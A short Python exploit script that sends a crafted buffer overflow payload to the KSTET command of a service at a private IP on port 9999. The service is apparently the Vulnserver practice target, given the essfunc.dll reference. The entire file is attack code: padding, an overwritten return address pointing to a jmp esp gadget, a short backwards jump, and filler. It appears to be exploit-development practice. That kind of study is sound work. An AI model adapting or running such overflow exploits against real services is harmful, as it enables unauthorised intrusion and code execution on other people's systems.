#!/usr/bin/python

import os
import socket
import sys

host = '192.168.100.118'
port = 9999

buffer =  'KSTET '
buffer += "A" * 70
buffer += "\xAF\x11\x50\x62"  # 0x625011AF - jmp esp - essfunc.dll
buffer += "\xEB\xB4"	      # Short jump - Jmp 00B7F9C2
buffer += "C" * (1000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.recv(1024)
s.send(buffer)
s.close()

